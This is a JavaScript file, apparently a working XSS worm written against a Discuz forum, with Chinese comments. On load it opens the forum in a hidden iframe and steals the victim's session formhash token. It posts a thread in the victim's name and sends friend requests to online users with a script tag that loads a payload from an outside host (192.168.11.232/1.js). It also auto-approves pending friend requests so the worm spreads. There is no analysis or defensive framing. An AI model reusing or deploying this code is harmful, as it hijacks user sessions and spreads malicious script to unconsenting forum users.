//基础函数，把key,value转换给query字段，用于ajax
var toQueryString = function(form_data) {
	arr = new Array()
	for (var x in form_data) {
		arr.push(x + "=" + form_data[x]);
	}
	return arr.join('&');
}


//基础函数，发送ajax POST请求
var data_Post = function(url, form_data) {
	xhr = new XMLHttpRequest();
	xhr.open("POST", url, true);
	xhr.setRequestHeader('Content-Type', "application/x-www-form-urlencoded");
	xhr.send(toQueryString(form_data));
}


//向某个用户发送好友请求，参数是uid
function sendExp(uid) {
	var form_data = {};
	form_data['reffer'] = "";
	form_data['addsubmit'] = "true";
	form_data['handlekey'] = "a_friend_li_" + uid;
	form_data['formhash'] = formhash;
	//xss脚本存放的位置
	form_data['note'] = "Hello,my friend!<script src='http://192.168.11.232/1.js'></script>";
	form_data['gid'] = "1";
	var url = "/dz/upload/home.php?mod=spacecp&ac=friend&op=add&uid=" + uid;
	data_Post(url, form_data);
}


/*
POST /dz/upload/home.php?mod=spacecp&ac=friend&op=add&uid=2&inajax=1 HTTP/1.1
referer=&add2submit=true&from=notice&handlekey=afr_2&formhash=6a2d5ba8&gid=1
*/
//获取接收到的好友请求的uid的列表,用户能从论坛两个不同的地方获取，所以做了if分支针对不同的情况
var getPendingRequest = function() {
	var pending_list = new Array();
	if (document.location.href.match(/do=notice/) != null) {
		var tt = document.getElementsByClassName('xi2');
		for (var i = 0; i < tt.length; i++) {
			if (tt[i].tagName == 'A' && tt[i].href.match(/^http:\/\/.*uid=(\d+)$/) != null) {
				pending_list.push(tt[i].href.match(/^http:\/\/.*uid=(\d+)$/)[1]);
			}
		}
		//return pending_list;
	} else {
		var x = document.getElementsByTagName('h4')
		console.log(x)
		for (var i = 0; i < x.length; i++) {
			var tmp = x[i].firstElementChild.href.match(/^http:\/\/.*uid=(\d+)$/)[1];
				pending_list.push(tmp);
		}

	}
	return pending_list;
}

//批准所有用户的好友申请
var approvePendingRequest = function(uid) {
	var form_data = {};
	form_data['referer'] = "";
	form_data['add2submit'] = "true";
	form_data['handlekey'] = "afr_" + uid;
	form_data['formhash'] = formhash;
	form_data['from'] = "notice";
	form_data['gid'] = "1";
	var url = "/dz/upload/home.php?mod=spacecp&ac=friend&op=add&inajax=1&uid=" + uid;
	data_Post(url, form_data);
}


//formhash=6a2d5ba8&subject=3333&message=hahahhahahha+%0D%0A
//发帖
var postThread = function() {
	var form_data = {};
	form_data['subject'] = "Submited Time: " + new Date().getTime();
	form_data['formhash'] = formhash;
	form_data['message'] = "But most of all, hYdr@ are best!";
	var url = "/dz/upload/forum.php?mod=post&action=newthread&fid=2&extra=&topicsubmit=yes";
	data_Post(url, form_data);
}


//主运行函数
var run = function() {
	var if1 = document.createElement('iframe');
	if1.src = "/dz/upload/forum.php";
	if1.style.width = "0px";
	if1.style.height = "0px";
	document.body.appendChild(if1);
	if1.onload = function() {
		//获取自己的uid
		own_id = if1.contentDocument.getElementsByClassName('vwmy')[0].href.match(/^http:\/\/.*uid=(\d+)/)[1]

		//获取在线的人的uid的列表
		var a_tags = if1.contentDocument.getElementsByTagName('a');
		uid_list = new Array();
		for (var i = 0; i < a_tags.length; i++) {
			if (a_tags[i].text == 'Logout') {
				//console.log(a_list[x]);
				//获取用户会话的token
				formhash = a_tags[i].href.match(/^http:\/\/.*formhash=(.*)/)[1];
			}
			if (a_tags[i].href.match(/^http:\/\/.*uid=(\d+)$/) != null) {
				var tmp_id = a_tags[i].href.match(/^http:\/\/.*uid=(\d+)$/)[1];
				//非本用户id加到list里
				if (tmp_id != own_id) {
					uid_list.push(tmp_id);
				}
			}
		}

		//开始蠕虫，先发帖
		postThread();

		//向首页能看到的在线用户发送好友申请，打上xss脚本
		for (var i=0; i<uid_list.length; i++) {
			sendExp(uid_list[i]);
		}

		//获取好后请求列表里的用户id,并同意所有用户请求
		//sendExp(4);
		pending_list = getPendingRequest();
		for (var i = 0; i < pending_list.length; i++) {
			approvePendingRequest(pending_list[i]);
		}

	}

}
run();

